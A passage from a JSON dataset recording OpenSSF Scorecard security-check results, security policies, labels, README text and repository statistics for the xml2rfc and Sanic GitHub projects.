                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/build-docker-images.yml:17",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/checks.yml:16",
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/checks.yml:15",
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/pypi-publish.yml:17",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/pypi-publish.yml:140",
                        "Warn: no topLevel permission defined: .github/workflows/build-docker-images.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/checks.yml:1",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/docs-publish.yml:13",
                        "Warn: no topLevel permission defined: .github/workflows/pypi-publish.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-h5c8-rqwp-cp95",
                        "Warn: Project is vulnerable to: GHSA-h75v-3vvj-5mfj",
                        "Warn: Project is vulnerable to: GHSA-8q59-q68h-6hv4 / PYSEC-2021-142",
                        "Warn: Project is vulnerable to: GHSA-9wx4-h78v-vm56",
                        "Warn: Project is vulnerable to: GHSA-j8r2-6x86-q33q / PYSEC-2023-74",
                        "Warn: Project is vulnerable to: GHSA-pg2w-x9wp-vw92 / PYSEC-2015-17",
                        "Warn: Project is vulnerable to: GHSA-x84v-xcm2-53pg / PYSEC-2018-28",
                        "Warn: Project is vulnerable to: GHSA-cx63-2mw6-8hw5",
                        "Warn: Project is vulnerable to: GHSA-r9hx-vwmv-q579 / PYSEC-2022-43012"
                    ],
                    "score": 1,
                    "reason": "9 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/ietf-tools/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "Refer to the [IETF Infrastructure and Services Vulnerability Disclosure](https://www.ietf.org/about/administration/policies-procedures/vulnerability-disclosure/) on how to disclose vulnerabilities in a secure manner.\n",
        "project_all_labels": [
            "accepted",
            "blocker",
            "bug",
            "component: v3 vocabulary",
            "critical",
            "documentation",
            "enhancement",
            "good first issue",
            "html",
            "major",
            "medium",
            "minor",
            "pdf",
            "preptool",
            "rfc waiting",
            "rpat",
            "rswg",
            "text",
            "trivial",
            "under_review",
            "v2v3",
            "waiting",
            "wontfix"
        ],
        "README_content": "<div align=\"center\">\n    \n<img src=\"https://raw.githubusercontent.com/ietf-tools/common/main/assets/logos/xml2rfc.svg\" alt=\"XML2RFC\" height=\"125\" />\n    \n[![Release](https://img.shields.io/github/release/ietf-tools/xml2rfc.svg?style=flat&maxAge=600)](https://github.com/ietf-tools/xml2rfc/releases)\n[![License](https://img.shields.io/github/license/ietf-tools/xml2rfc)](https://github.com/ietf-tools/xml2rfc/blob/main/LICENSE)\n[![PyPI - Version](https://img.shields.io/pypi/v/xml2rfc)](https://pypi.org/project/xml2rfc/)\n[![PyPI - Status](https://img.shields.io/pypi/status/xml2rfc)](https://pypi.org/project/xml2rfc/)\n[![PyPI - Format](https://img.shields.io/pypi/format/xml2rfc)](https://pypi.org/project/xml2rfc/)\n    \n##### Generate RFCs and IETF drafts from document source in XML according to the IETF xml2rfc v2 and v3 vocabularies\n    \n</div>\n\n- [Changelog](https://github.com/ietf-tools/xml2rfc/blob/main/CHANGELOG.md)\n- [Installation](#installation)\n- [Usage](#usage)\n- [Contributing](https://github.com/ietf-tools/.github/blob/main/CONTRIBUTING.md)\n- [Getting Started](#getting-started)\n    - [Git Cloning Tips](#git-cloning-tips)\n    - [Docker Dev Environment](#docker-dev-environment)\n- [Release Procedure](https://github.com/ietf-tools/.github/blob/main/CONTRIBUTING.md#release-procedure)\n\n---\n\n### Introduction\n\nThe [IETF] uses a specific format for the standards and other documents it publishes as [RFCs], and for the draft documents which are produced when developing documents for publications. There exists a number of different tools to facilitate the formatting of drafts and RFCs according to the existing rules, and this tool, **xml2rfc**, is one of them. It takes as input an xml file that contains the text and meta-information about author names etc., and transforms it into suitably formatted output. The input xml file should follow the grammars in [RFC7749] *(for v2 documents)* or [RFC7991] *(for v3 documents)*. Note that the grammar for v3 is still being refined, and changes will eventually be captured in the [bis draft for 7991]. Changes not yet captured can be seen in the xml2rfc source [v3.rng], or in the [documentation xml2rfc produces] with its `--doc` flag.\n\n**xml2rfc** provides a variety of output formats. See the command line help for a full list of formats. It also provides conversion from v2 to v3, and can run the [preptool] on its input.\n\n### Installation\n\nInstallation of the python package is done as usual with `pip install xml2rfc`, using appropriate switches.\n\n#### Installation of support libraries for the PDF-formatter\n\nIn order to generate PDFs, **xml2rfc** uses the [WeasyPrint] module, which depends on external libraries that must be installed as native packages on your platform, separately from the **xml2rfc** install.\n\n1. First, install the **Pango**, and other required libraries on your system.  See installation instructions on the [WeasyPrint Docs].\n\n2. Next, install WeasyPrint python modules using pip.\n\n```sh\npip install xml2rfc[pdf]\n```\n3. Finally, install the required fonts:\n  * Download latest fonts from [xml2rfc-fonts](https://github.com/ietf-tools/xml2rfc-fonts/releases/latest).\n  * In the **Assets** section, download either the `tar.gz` or the `zip` archive.\n  * Extract the contents of the downloaded `xml2rfc-fonts` archive.\n  * Install the fonts found in the `noto` and `roboto_mono` directories to your operating system.\n\nWith these installed and available to **xml2rfc**, the `--pdf` switch will be enabled.\n\n### Usage\n\n**xml2rfc** accepts a single XML document as input and outputs to one or more conversion formats.\n\n#### Basic Usage\n\n```sh\nxml2rfc SOURCE [options] FORMATS...\n```\n\nRun `xml2rfc --help` for a full listing of command-line options.\n\n### Getting Started\n\nThis project is following the standard **Git Feature Workflow** development model. Learn about all the various steps of the development workflow, from creating a fork to submitting a pull request, in the [Contributing](https://github.com/ietf-tools/.github/blob/main/CONTRIBUTING.md) guide.\n\n> Make sure to read the [Styleguides](https://github.com/ietf-tools/.github/blob/main/CONTRIBUTING.md#styleguides) section to ensure a cohesive code format across the project.\n\nYou can submit bug reports, enhancements and new feature requests in the [discussions](https://github.com/ietf-tools/xml2rfc/discussions) area. Accepted tickets will be converted to issues.\n\n#### Git Cloning Tips\n\nAs outlined in the [Contributing](https://github.com/ietf-tools/.github/blob/main/CONTRIBUTING.md) guide, you will first want to create a fork of the xml2rfc project in your personal GitHub account before cloning it.\n\nFor example *(replace `USERNAME` with your GitHub username)*:\n\n```sh\ngit clone https://github.com/USERNAME/xml2rfc.git\n```\n#### Docker Dev Environment\n\nRun `./run.sh` command to build and start a docker development environment.\nThe initial build may take time because it downloads all required fonts as well.\n\n\n```sh\n./run.sh\n```\n\n[IETF]: https://www.ietf.org/\n[RFCs]: https://www.rfc-editor.org/\n[RFC7749]: https://www.rfc-editor.org/info/rfc7749\n[RFC7991]: https://www.rfc-editor.org/info/rfc7991\n[bis draft for 7991]: https://datatracker.ietf.org/doc/draft-iab-rfc7991bis/\n[v3.rng]: xml2rfc/data/v3.rng\n[documentation xml2rfc produces]: https://ietf-tools.github.io/xml2rfc/\n[preptool]: https://www.rfc-editor.org/info/rfc7998\n[WeasyPrint]: https://weasyprint.org/\n[WeasyPrint Docs]: https://doc.courtbouillon.org/weasyprint/stable/first_steps.html\n",
        "num_commits": 2633,
        "project_age_days": 997,
        "project_created_at": "2022-02-05",
        "latest_updated_at": "2024-10-28",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 18,
        "num_pull": 175,
        "num_issues": 1131,
        "num_opening_issue": 247,
        "project_size(kB)": 264507,
        "num_stargazers": 69,
        "num_watchers": 69,
        "num_forks": 38,
        "num_subscribers": 14,
        "SecurityPolicy_created_at": "2022-01-26 23:15:31",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "bf1a19a84c1769a86c3a16ceecb648a7b19d28eb",
                "url": "https://github.com/ietf-tools/.github/commit/bf1a19a84c1769a86c3a16ceecb648a7b19d28eb",
                "date": "2022-01-26 23:15:31"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "sanic-org/sanic",
        "project_url": "https://github.com/sanic-org/sanic",
        "SSF": {
            "date": "2024-10-29T20:14:12+07:00",
            "repo": {
                "name": "github.com/sanic-org/sanic",
                "commit": "da1c6465852c8fc0b77ee2618d845665292045e0"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.7,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'allow deletion' disabled on branch '23.12LTS'",
                        "Info: 'allow deletion' disabled on branch 'current-release'",
                        "Info: 'allow deletion' disabled on branch '21.12LTS'",
                        "Info: 'allow deletion' disabled on branch '20.12LTS'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch '23.12LTS'",
                        "Warn: 'force pushes' enabled on branch 'current-release'",
                        "Info: 'force pushes' disabled on branch '21.12LTS'",
                        "Info: 'force pushes' disabled on branch '20.12LTS'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'main'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch '23.12LTS'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'current-release'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch '21.12LTS'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch '20.12LTS'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: required approving review count is 1 on branch '23.12LTS'",
                        "Warn: required approving review count is 1 on branch '21.12LTS'",
                        "Warn: required approving review count is 1 on branch '20.12LTS'",
                        "Info: codeowner review is required on branch 'main'",
                        "Info: codeowner review is required on branch '23.12LTS'",
                        "Warn: could not determine whether codeowners review is allowed",
                        "Info: codeowner review is required on branch '21.12LTS'",
                        "Info: codeowner review is required on branch '20.12LTS'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: status check found to merge onto on branch '23.12LTS'",
                        "Warn: no status checks found to merge onto branch 'current-release'",
                        "Info: status check found to merge onto on branch '21.12LTS'",
                        "Info: status check found to merge onto on branch '20.12LTS'",
                        "Info: PRs are required in order to make changes on branch 'main'",
                        "Info: PRs are required in order to make changes on branch '23.12LTS'",
                        "Warn: PRs are not required to make changes on branch 'current-release'; or we don't have data to detect it.If you think it might be the latter, make sure to run Scorecard with a PAT or use Repo Rules (that are always public) instead of Branch Protection settings",
                        "Info: PRs are required in order to make changes on branch '21.12LTS'",
                        "Info: PRs are required in order to make changes on branch '20.12LTS'"
                    ],
                    "score": 2,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "26 out of 26 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 4,
                    "reason": "Found 13/30 approved changesets -- score normalized to 4",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: pytorch contributor org/company found, airbnb contributor org/company found, csiro contributor org/company found, aheui contributor org/company found, northern-lights-awards contributor org/company found, sanic-org contributor org/company found, the-benchmarker contributor org/company found, 2i2c contributor org/company found, PyO3 contributor org/company found, gureum contributor org/company found, Giftpack contributor org/company found, team-crescendo contributor org/company found, SiruBOT contributor org/company found, cloudevents contributor org/company found, aws contributor org/company found, Korea-Minecraft-Forum contributor org/company found, oracle contributor org/company found, performous contributor org/company found, meta meta contributor org/company found, jazzband contributor org/company found, dl contributor org/company found, RustPython contributor org/company found, aiorchestra contributor org/company found, fnproject contributor org/company found, comcast contributor org/company found, cisco systems contributor org/company found, bosondata contributor org/company found, xchataqua contributor org/company found, youknowone.org contributor org/company found, caramel-moe contributor org/company found, celery contributor org/company found, packetfabric contributor org/company found, cn contributor org/company found, wechatpy contributor org/company found, freelancer / consultant contributor org/company found, conda-forge contributor org/company found, encode contributor org/company found, apache contributor org/company found, rust-cross contributor org/company found, akamai @linode contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 40 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 5,
                    "reason": "0 commit(s) and 6 issue activity found in the last 90 days -- score normalized to 5",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish-release.yml:90"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/codeql-analysis.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/coverage.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/coverage.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/coverage.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/coverage.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-release.yml:132: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:135: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:138: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:144: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:168: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/publish-release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-release.yml:99: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/publish-release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-release.yml:102: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:117: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/sanic-org/sanic/tests.yml/main?enable=pin",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:5",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile-base:3",
                        "Warn: containerImage not pinned by hash: examples/Dockerfile:1: pin your Docker image by updating sanicframework/sanic:LTS to sanicframework/sanic:LTS@sha256:1c58a148a06cc65b3417c0a74174d09a239d0761dfa779a9ce3ce0274bac0b36",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:12",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:12",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish-release.yml:108",
                        "Info:   0 out of   7 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   8 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   3 pipCommand dependencies pinned",
                        "Info:   0 out of   3 containerImage dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: all commits (26) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool is run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/coverage.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/sanic-org/sanic/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nSee https://sanic.dev/en/organization/policies.html\n",
        "project_all_labels": [
            "advanced",
            "advisory",
            "beginner",
            "breaking",
            "bug",
            "bug-fixed",
            "deprecation",
            "documentation",
            "duplicate",
            "enhancement",
            "feature request",
            "help wanted",
            "idea discussion",
            "information required",
            "intermediate",
            "invalid",
            "LTS",
            "necessary",
            "needs investigation",
            "needs review",
            "needs tests",
            "nice to have",
            "on hold",
            "question",
            "refactoring",
            "release-needed",
            "RFC",
            "stale",
            "unit-test",
            "urgent",
            "windows",
            "wontfix"
        ],
        "README_content": ".. image:: https://raw.githubusercontent.com/sanic-org/sanic-assets/master/png/sanic-framework-logo-400x97.png\n    :alt: Sanic | Build fast. Run fast.\n\nSanic | Build fast. Run fast.\n=============================\n\n.. start-badges\n\n.. list-table::\n    :widths: 15 85\n    :stub-columns: 1\n\n    * - Build\n      - | |Tests|\n    * - Docs\n      - | |UserGuide| |Documentation|\n    * - Package\n      - | |PyPI| |PyPI version| |Wheel| |Supported implementations| |Code style ruff|\n    * - Support\n      - | |Forums| |Discord| |Awesome|\n    * - Stats\n      - | |Monthly Downloads| |Weekly Downloads| |Conda downloads|\n\n.. |UserGuide| image:: https://img.shields.io/badge/user%20guide-sanic-ff0068\n   :target: https://sanic.dev/\n.. |Forums| image:: https://img.shields.io/badge/forums-community-ff0068.svg\n   :target: https://community.sanicframework.org/\n.. |Discord| image:: https://img.shields.io/discord/812221182594121728?logo=discord&label=Discord&color=5865F2\n   :target: https://discord.gg/FARQzAEMAA\n.. |Tests| image:: https://github.com/sanic-org/sanic/actions/workflows/tests.yml/badge.svg?branch=main\n   :target: https://github.com/sanic-org/sanic/actions/workflows/tests.yml\n.. |Documentation| image:: https://readthedocs.org/projects/sanic/badge/?version=latest\n   :target: http://sanic.readthedocs.io/en/latest/?badge=latest\n.. |PyPI| image:: https://img.shields.io/pypi/v/sanic.svg\n   :target: https://pypi.python.org/pypi/sanic/\n.. |PyPI version| image:: https://img.shields.io/pypi/pyversions/sanic.svg\n   :target: https://pypi.python.org/pypi/sanic/\n.. |Code style ruff| image:: https://img.shields.io/badge/code%20style-ruff-000000.svg\n    :target: https://docs.astral.sh/ruff/\n.. |Wheel| image:: https://img.shields.io/pypi/wheel/sanic.svg\n    :alt: PyPI Wheel\n    :target: https://pypi.python.org/pypi/sanic\n.. |Supported implementations| image:: https://img.shields.io/pypi/implementation/sanic.svg\n    :alt: Supported implementations\n    :target: https://pypi.python.org/pypi/sanic\n.. |Awesome| image:: https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg\n    :alt: Awesome Sanic List\n    :target: https://github.com/mekicha/awesome-sanic\n.. |Monthly Downloads| image:: https://img.shields.io/pypi/dm/sanic.svg\n    :alt: Downloads\n    :target: https://pepy.tech/project/sanic\n.. |Weekly Downloads| image:: https://img.shields.io/pypi/dw/sanic.svg\n    :alt: Downloads\n    :target: https://pepy.tech/project/sanic\n.. |Conda downloads| image:: https://img.shields.io/conda/dn/conda-forge/sanic.svg\n    :alt: Downloads\n    :target: https://anaconda.org/conda-forge/sanic\n\n.. end-badges\n\nSanic is a **Python 3.8+** web server and web framework that's written to go fast. It allows the usage of the ``async/await`` syntax added in Python 3.5, which makes your code non-blocking and speedy.\n\nSanic is also ASGI compliant, so you can deploy it with an `alternative ASGI webserver <https://sanicframework.org/en/guide/deployment/running.html#asgi>`_.\n\n`Source code on GitHub <https://github.com/sanic-org/sanic/>`_ | `Help and discussion board <https://community.sanicframework.org/>`_ | `User Guide <https://sanicframework.org>`_ | `Chat on Discord <https://discord.gg/FARQzAEMAA>`_\n\nThe project is maintained by the community, for the community. **Contributions are welcome!**\n\nThe goal of the project is to provide a simple way to get up and running a highly performant HTTP server that is easy to build, to expand, and ultimately to scale.\n\nSponsor\n-------\n\nCheck out `open collective <https://opencollective.com/sanic-org>`_ to learn more about helping to fund Sanic.\n\n\nInstallation\n------------\n\n``pip3 install sanic``\n\n    Sanic makes use of ``uvloop`` and ``ujson`` to help with performance. If you do not want to use those packages, simply add an environmental variable ``SANIC_NO_UVLOOP=true`` or ``SANIC_NO_UJSON=true`` at install time.\n\n    .. code:: shell\n\n       $ export SANIC_NO_UVLOOP=true\n       $ export SANIC_NO_UJSON=true\n       $ pip3 install --no-binary :all: sanic\n\n\n.. note::\n\n  If you are running on a clean install of Fedora 28 or above, please make sure you have the ``redhat-rpm-config`` package installed in case if you want to\n  use ``sanic`` with ``ujson`` dependency.\n\n\nHello World Example\n-------------------\n\n.. code:: python\n\n    from sanic import Sanic\n    from sanic.response import json\n\n    app = Sanic(\"my-hello-world-app\")\n\n    @app.route('/')\n    async def test(request):\n        return json({'hello': 'world'})\n\n    if __name__ == '__main__':\n        app.run()\n\nSanic can now be easily run using ``sanic hello.app``.\n\n.. code::\n\n    [2018-12-30 11:37:41 +0200] [13564] [INFO] Goin' Fast @ http://127.0.0.1:8000\n    [2018-12-30 11:37:41 +0200] [13564] [INFO] Starting worker [13564]\n\nAnd, we can verify it is working: ``curl localhost:8000 -i``\n\n.. code::\n\n    HTTP/1.1 200 OK\n    Connection: keep-alive\n    Keep-Alive: 5\n    Content-Length: 17\n    Content-Type: application/json\n\n    {\"hello\":\"world\"}\n\n**Now, let's go build something fast!**\n\nMinimum Python version is 3.8. If you need Python 3.7 support, please use v22.12LTS.\n\nDocumentation\n-------------\n\nUser Guide, Changelog, and API Documentation can be found at `sanic.dev <https://sanic.dev>`__.\n\n\nQuestions and Discussion\n------------------------\n\n`Ask a question or join the conversation <https://community.sanicframework.org/>`__.\n\nContribution\n------------\n\nWe are always happy to have new contributions. We have `marked issues good for anyone looking to get started <https://github.com/sanic-org/sanic/issues?q=is%3Aopen+is%3Aissue+label%3Abeginner>`_, and welcome `questions on the forums <https://community.sanicframework.org/>`_. Please take a look at our `Contribution guidelines <https://github.com/sanic-org/sanic/blob/master/CONTRIBUTING.rst>`_.\n",
        "num_commits": 2906,
        "project_age_days": 3078,
        "project_created_at": "2016-05-26",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-07-31",
        "num_contributors": 290,
        "num_pull": 1582,
        "num_issues": 3000,
        "num_opening_issue": 130,
        "project_size(kB)": 10350,
        "num_stargazers": 18076,
        "num_watchers": 18076,
